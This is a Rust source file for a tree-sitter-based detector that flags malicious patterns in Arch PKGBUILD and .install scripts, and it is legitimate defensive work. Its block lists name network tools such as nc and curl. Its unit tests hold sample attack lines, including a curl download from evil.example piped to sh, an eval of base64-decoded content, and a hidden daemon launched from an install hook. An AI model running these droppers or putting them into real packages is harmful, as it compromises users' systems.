//! Structure-aware PKGBUILD / `.install` analysis via tree-sitter-bash.
//!
//! This detector walks the bash AST to catch *novel* attacks by shape rather
//! than by signature: download-piped-to-shell, eval-of-decoded-content,
//! out-of-band network calls in build phases, writes outside the build dirs,
//! daemon-spawning install hooks, and large opaque blobs. It also emits the
//! PKGBUILD `FeatureVector` (schema v1) that feeds the phase-2 ML corpus.

use aurscan_core::{
    Confidence, Detector, DetectorId, DetectorResult, Evidence, FeatureId, FeatureVector, Finding,
    ScanContext, ScanTarget, ScriptKind, Severity,
};
use tree_sitter::Node;

/// Command names that resolve to a shell interpreter (pipe-to-shell target).
const SHELL_NAMES: &[&str] = &["sh", "bash", "zsh", "dash", "ash"];
/// Commands whose output being piped into a shell is the classic dropper.
const PIPE_SOURCE_NAMES: &[&str] = &["curl", "wget", "fetch", "python", "python3", "perl"];
/// Network-capable commands that do not belong in build phases.
const NETWORK_NAMES: &[&str] = &["curl", "wget", "fetch", "git", "rsync", "scp", "nc", "ncat"];
/// Commands that write files to a destination path.
const WRITE_NAMES: &[&str] = &["cp", "mv", "install", "tee", "dd", "ln"];
/// PKGBUILD / install phases where a bare network fetch is out-of-band.
const NETWORK_PHASES: &[&str] = &[
    "prepare",
    "build",
    "package",
    "post_install",
    "pre_install",
    "post_upgrade",
];
/// Install-hook functions that run as root at package (un)install time.
const INSTALL_HOOK_FNS: &[&str] = &[
    "post_install",
    "pre_install",
    "post_upgrade",
    "pre_upgrade",
    "post_remove",
    "pre_remove",
];
/// Phases where a spawned daemon in an install hook is high-risk.
const DAEMON_PHASES: &[&str] = &["post_install", "post_upgrade"];
/// Substrings that mark a destination path as a legitimate build target.
const SAFE_DEST_MARKERS: &[&str] = &["$pkgdir", "${pkgdir}", "$srcdir", "${srcdir}", "/tmp"];

pub struct PkgbuildStaticDetector {
    lang: tree_sitter::Language,
}

impl PkgbuildStaticDetector {
    pub fn new() -> Self {
        Self {
            lang: tree_sitter_bash::LANGUAGE.into(),
        }
    }
}

impl Default for PkgbuildStaticDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for PkgbuildStaticDetector {
    fn id(&self) -> DetectorId {
        DetectorId("pkgbuild_static")
    }

    fn wants(&self, target: &ScanTarget) -> bool {
        matches!(
            target,
            ScanTarget::BuildScript {
                kind: ScriptKind::Pkgbuild | ScriptKind::InstallScript | ScriptKind::Other,
                ..
            }
        )
    }

    fn scan(&self, target: &ScanTarget, ctx: &ScanContext) -> DetectorResult {
        let (path, kind) = match target {
            ScanTarget::BuildScript { path, kind } => (path, *kind),
            _ => return DetectorResult::default(),
        };
        let src = match std::fs::read_to_string(path) {
            Ok(s) => s,
            Err(_) => return DetectorResult::default(),
        };
        let location = path.display().to_string();

        let mut parser = tree_sitter::Parser::new();
        if parser.set_language(&self.lang).is_err() {
            return DetectorResult::default();
        }
        let tree = match parser.parse(&src, None) {
            Some(t) => t,
            None => return DetectorResult::default(),
        };

        let mut walker = Walker {
            src: &src,
            kind,
            package: &ctx.package,
            location: &location,
            findings: Vec::new(),
            feat: Features::default(),
        };
        walker.visit(tree.root_node(), None, 0);

        DetectorResult {
            findings: walker.findings,
            features: Some(walker.feat.into_vector(&src, kind)),
        }
    }
}

/// Shannon entropy of a byte slice, in bits per byte.
fn entropy(s: &[u8]) -> f32 {
    if s.is_empty() {
        return 0.0;
    }
    let mut hist = [0u32; 256];
    for &b in s {
        hist[b as usize] += 1;
    }
    let len = s.len() as f32;
    let mut h = 0.0f32;
    for &c in hist.iter() {
        if c > 0 {
            let p = c as f32 / len;
            h -= p * p.log2();
        }
    }
    h
}

/// Strip a single layer of matching surrounding quotes.
fn unquote(s: &str) -> &str {
    let b = s.as_bytes();
    if b.len() >= 2 && (b[0] == b'"' || b[0] == b'\'') && b[b.len() - 1] == b[0] {
        &s[1..s.len() - 1]
    } else {
        s
    }
}

/// True when a string looks like an opaque base64 blob.
fn is_base64ish(s: &str) -> bool {
    let s = s.trim();
    s.len() >= 24
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
}

#[derive(Default)]
struct Features {
    string_entropies: Vec<f32>,
    count_base64ish: u32,
    count_eval: u32,
    count_cmd_subst: u32,
    count_pipes_to_shell: u32,
    count_network: u32,
    count_redirect_system: u32,
    count_chmod_exec: u32,
    depth_max: u32,
    count_functions: u32,
    has_install_hook: bool,
    count_hex_escapes: u32,
}

impl Features {
    fn into_vector(self, src: &str, kind: ScriptKind) -> FeatureVector {
        let mean_entropy = if self.string_entropies.is_empty() {
            0.0
        } else {
            self.string_entropies.iter().sum::<f32>() / self.string_entropies.len() as f32
        };
        let max_entropy = self.string_entropies.iter().copied().fold(0.0f32, f32::max);
        let has_hook = self.has_install_hook || matches!(kind, ScriptKind::InstallScript);
        let file_len = src.len() as u32;
        let max_line = src.lines().map(|l| l.len()).max().unwrap_or(0) as u32;
        FeatureVector {
            schema_version: 1,
            values: vec![
                (FeatureId(0), file_len as f32),
                (FeatureId(1), max_line as f32),
                (FeatureId(2), mean_entropy),
                (FeatureId(3), max_entropy),
                (FeatureId(4), self.count_base64ish as f32),
                (FeatureId(5), self.count_eval as f32),
                (FeatureId(6), self.count_cmd_subst as f32),
                (FeatureId(7), self.count_pipes_to_shell as f32),
                (FeatureId(8), self.count_network as f32),
                (FeatureId(9), self.count_redirect_system as f32),
                (FeatureId(10), self.count_chmod_exec as f32),
                (FeatureId(11), self.depth_max as f32),
                (FeatureId(12), self.count_functions as f32),
                (FeatureId(13), if has_hook { 1.0 } else { 0.0 }),
                (FeatureId(14), self.count_hex_escapes as f32),
            ],
        }
    }
}

struct Walker<'a> {
    src: &'a str,
    kind: ScriptKind,
    package: &'a str,
    location: &'a str,
    findings: Vec<Finding>,
    feat: Features,
}

impl<'a> Walker<'a> {
    fn text(&self, node: Node) -> &'a str {
        node.utf8_text(self.src.as_bytes()).unwrap_or("")
    }

    fn line(&self, node: Node) -> usize {
        node.start_position().row + 1
    }

    fn evidence(&self, node: Node) -> Evidence {
        let mut excerpt = self.text(node).trim().to_string();
        if excerpt.len() > 200 {
            excerpt.truncate(200);
        }
        Evidence {
            location: format!("{}:{}", self.location, self.line(node)),
            excerpt,
        }
    }

    fn push(&mut self, severity: Severity, reason: String, node: Node) {
        let evidence = self.evidence(node);
        self.findings.push(Finding {
            severity,
            confidence: Confidence::Heuristic,
            detector: DetectorId("pkgbuild_static"),
            package: self.package.to_string(),
            reason,
            evidence,
        });
    }

    /// The command-name text of a `command` node, if present.
    fn command_name(&self, node: Node) -> Option<&'a str> {
        node.child_by_field_name("name").map(|n| self.text(n))
    }

    /// Resolved argument texts (quotes stripped) of a `command` node.
    fn arguments(&self, node: Node) -> Vec<&'a str> {
        let mut out = Vec::new();
        let mut cursor = node.walk();
        for child in node.children_by_field_name("argument", &mut cursor) {
            out.push(unquote(self.text(child)));
        }
        out
    }

    /// True when any descendant node has the given kind.
    fn has_descendant_kind(&self, node: Node, kind: &str) -> bool {
        let mut cursor = node.walk();
        let mut stack = vec![node];
        while let Some(n) = stack.pop() {
            if n.kind() == kind {
                return true;
            }
            for c in n.children(&mut cursor) {
                stack.push(c);
            }
        }
        false
    }

    fn visit(&mut self, node: Node, cur_fn: Option<&str>, depth: usize) {
        let kind = node.kind();

        // Track nesting depth of compound statements for the feature vector.
        let child_depth = if kind == "compound_statement" {
            let d = depth + 1;
            self.feat.depth_max = self.feat.depth_max.max(d as u32);
            d
        } else {
            depth
        };

        // Determine the function scope for children.
        let mut child_fn = cur_fn;
        let owned_fn;
        if kind == "function_definition" {
            self.feat.count_functions += 1;
            owned_fn = node.child_by_field_name("name").map(|n| self.text(n));
            if let Some(name) = owned_fn {
                if INSTALL_HOOK_FNS.contains(&name) {
                    self.feat.has_install_hook = true;
                }
                child_fn = Some(name);
            }
        }

        match kind {
            "string" | "raw_string" => self.on_string(node),
            "command_substitution" => self.feat.count_cmd_subst += 1,
            "pipeline" => self.on_pipeline(node, cur_fn),
            "file_redirect" => self.on_redirect(node, cur_fn),
            "command" => self.on_command(node, cur_fn),
            _ => {}
        }

        let mut cursor = node.walk();
        let children: Vec<Node> = node.children(&mut cursor).collect();
        for child in children {
            self.visit(child, child_fn, child_depth);
        }
    }

    fn on_string(&mut self, node: Node) {
        let content = unquote(self.text(node));
        self.feat.string_entropies.push(entropy(content.as_bytes()));
        if is_base64ish(content) {
            self.feat.count_base64ish += 1;
        }
        let hexes = content.matches("\\x").count();
        self.feat.count_hex_escapes += hexes as u32;
        // Large opaque blob: high-entropy long literal or a long hex-escape run.
        let blob_by_entropy = content.len() > 512 && entropy(content.as_bytes()) > 4.5;
        let blob_by_hex = hexes > 20;
        if blob_by_entropy || blob_by_hex {
            self.push(
                Severity::Medium,
                "large opaque blob embedded in build script".to_string(),
                node,
            );
        }
    }

    fn on_pipeline(&mut self, node: Node, cur_fn: Option<&str>) {
        let mut cursor = node.walk();
        let cmds: Vec<Node> = node
            .children(&mut cursor)
            .filter(|c| c.kind() == "command")
            .collect();
        let (Some(first), Some(last)) = (cmds.first(), cmds.last()) else {
            return;
        };
        if cmds.len() < 2 {
            return;
        }
        let first_name = self.command_name(*first).unwrap_or("");
        let last_name = self.command_name(*last).unwrap_or("");
        if SHELL_NAMES.contains(&last_name) && PIPE_SOURCE_NAMES.contains(&first_name) {
            self.feat.count_pipes_to_shell += 1;
            let scope = cur_fn.unwrap_or("script");
            self.push(
                Severity::High,
                format!("{first_name} output piped directly into {last_name} in {scope}()"),
                node,
            );
        }
    }

    fn on_redirect(&mut self, node: Node, cur_fn: Option<&str>) {
        let Some(dest) = node.child_by_field_name("destination") else {
            return;
        };
        let dest_text = unquote(self.text(dest));
        if self.is_system_path(dest_text) {
            self.feat.count_redirect_system += 1;
            let scope = cur_fn.unwrap_or("script");
            self.push(
                Severity::High,
                format!("redirect writes to system path {dest_text} in {scope}()"),
                node,
            );
        }
    }

    fn on_command(&mut self, node: Node, cur_fn: Option<&str>) {
        let Some(name) = self.command_name(node) else {
            return;
        };
        let args = self.arguments(node);

        if name == "eval" {
            self.on_eval(node, cur_fn);
        }

        if name == "chmod" && args.iter().any(|a| a.contains('x') || a.contains('7')) {
            self.feat.count_chmod_exec += 1;
        }

        if NETWORK_NAMES.contains(&name) {
            self.feat.count_network += 1;
            let in_phase = cur_fn.map(|f| NETWORK_PHASES.contains(&f)).unwrap_or(false);
            if in_phase {
                let scope = cur_fn.unwrap_or("script");
                // In `.install` hooks this runs as root at install time.
                let sev = if matches!(self.kind, ScriptKind::InstallScript) {
                    Severity::High
                } else {
                    Severity::Medium
                };
                self.push(
                    sev,
                    format!("out-of-band network call `{name}` in {scope}() (sources belong in source=())"),
                    node,
                );
            }
        }

        if WRITE_NAMES.contains(&name) {
            for arg in &args {
                if self.is_system_path(arg) {
                    let scope = cur_fn.unwrap_or("script");
                    self.push(
                        Severity::High,
                        format!(
                            "`{name}` writes to system path {arg} outside build dirs in {scope}()"
                        ),
                        node,
                    );
                    break;
                }
            }
        }

        if matches!(self.kind, ScriptKind::InstallScript) {
            self.check_daemon_hook(node, name, &args, cur_fn);
        }
    }

    fn on_eval(&mut self, node: Node, cur_fn: Option<&str>) {
        self.feat.count_eval += 1;
        let has_subst = self.has_descendant_kind(node, "command_substitution");
        if !has_subst {
            return;
        }
        let txt = self.text(node);
        let decodes = txt.contains("base64")
            || txt.contains("xxd")
            || txt.contains("openssl enc")
            || txt.contains("\\x")
            || txt.contains("gzip -d")
            || txt.contains("gunzip");
        let scope = cur_fn.unwrap_or("script");
        if decodes {
            self.push(
                Severity::High,
                format!("eval of decoded content (base64/xxd/openssl/hex) in {scope}()"),
                node,
            );
        } else {
            self.push(
                Severity::Medium,
                format!("eval of dynamic command substitution in {scope}()"),
                node,
            );
        }
    }

    fn check_daemon_hook(&mut self, node: Node, name: &str, args: &[&str], cur_fn: Option<&str>) {
        let in_phase = cur_fn.map(|f| DAEMON_PHASES.contains(&f)).unwrap_or(false);
        if !in_phase {
            return;
        }
        let backgrounded = node
            .next_sibling()
            .map(|s| s.kind() == "&")
            .unwrap_or(false);
        let is_daemon = matches!(name, "nohup" | "setsid" | "disown")
            || (name == "systemctl" && args.iter().any(|a| matches!(*a, "enable" | "start")))
            || backgrounded;
        if is_daemon {
            let scope = cur_fn.unwrap_or("script");
            self.push(
                Severity::High,
                format!("install hook spawns/enables a daemon via `{name}` in {scope}()"),
                node,
            );
        }
    }

    /// True when a destination path is an absolute system path that is not a
    /// sanctioned build directory.
    fn is_system_path(&self, dest: &str) -> bool {
        dest.starts_with('/') && !SAFE_DEST_MARKERS.iter().any(|m| dest.contains(m))
    }
}

// --- Contract assertions ---
const _: fn() = || {
    fn is_detector<T: aurscan_core::Detector>() {}
    is_detector::<PkgbuildStaticDetector>();
};

#[cfg(test)]
mod tests {
    use super::*;
    use aurscan_core::ScanContext;

    fn scan_str(content: &str, kind: ScriptKind) -> DetectorResult {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join(if kind == ScriptKind::Pkgbuild {
            "PKGBUILD"
        } else {
            "x.install"
        });
        std::fs::write(&p, content).unwrap();
        PkgbuildStaticDetector::new().scan(
            &ScanTarget::BuildScript { path: p, kind },
            &ScanContext {
                package: "t".into(),
                version: "1".into(),
                aur_meta: None,
            },
        )
    }

    #[test]
    fn curl_pipe_sh_in_build_is_high() {
        let r = scan_str(
            "build() {\n  curl -s https://evil.example/x.sh | sh\n}\n",
            ScriptKind::Pkgbuild,
        );
        assert!(r.findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn eval_of_base64_decode_is_high() {
        let r = scan_str(
            "prepare() {\n  eval \"$(echo aGk= | base64 -d)\"\n}\n",
            ScriptKind::Pkgbuild,
        );
        assert!(r
            .findings
            .iter()
            .any(|f| f.severity >= Severity::High && f.reason.contains("eval")));
    }

    #[test]
    fn network_in_prepare_is_medium() {
        // sources belong in source=(); a bare curl in prepare() is out-of-band
        let r = scan_str(
            "prepare() {\n  curl -O https://example.com/extra.tar.gz\n}\n",
            ScriptKind::Pkgbuild,
        );
        assert!(r.findings.iter().any(|f| f.severity >= Severity::Medium));
    }

    #[test]
    fn write_outside_pkgdir_is_high() {
        let r = scan_str(
            "package() {\n  cp payload /usr/lib/systemd/system/x.service\n}\n",
            ScriptKind::Pkgbuild,
        );
        assert!(r.findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn install_hook_spawning_daemon_is_high() {
        let r = scan_str(
            "post_install() {\n  systemctl enable --now helper.service\n  nohup /var/lib/.h &\n}\n",
            ScriptKind::InstallScript,
        );
        assert!(r.findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn benign_bin_pkgbuild_stays_below_high() {
        let benign = r#"
pkgname=tool-bin
pkgver=1.0
source=("https://github.com/owner/tool/releases/download/v1.0/tool.tar.gz")
sha256sums=('abc123')
package() {
  install -Dm755 tool "$pkgdir/usr/bin/tool"
}
"#;
        let r = scan_str(benign, ScriptKind::Pkgbuild);
        assert!(r.findings.iter().all(|f| f.severity < Severity::High));
    }

    #[test]
    fn features_always_emitted_with_schema_v1() {
        let r = scan_str("pkgname=x\n", ScriptKind::Pkgbuild);
        let fv = r.features.expect("features");
        assert_eq!(fv.schema_version, 1);
        assert!(fv.values.iter().any(|(id, _)| *id == FeatureId(0)));
    }
}
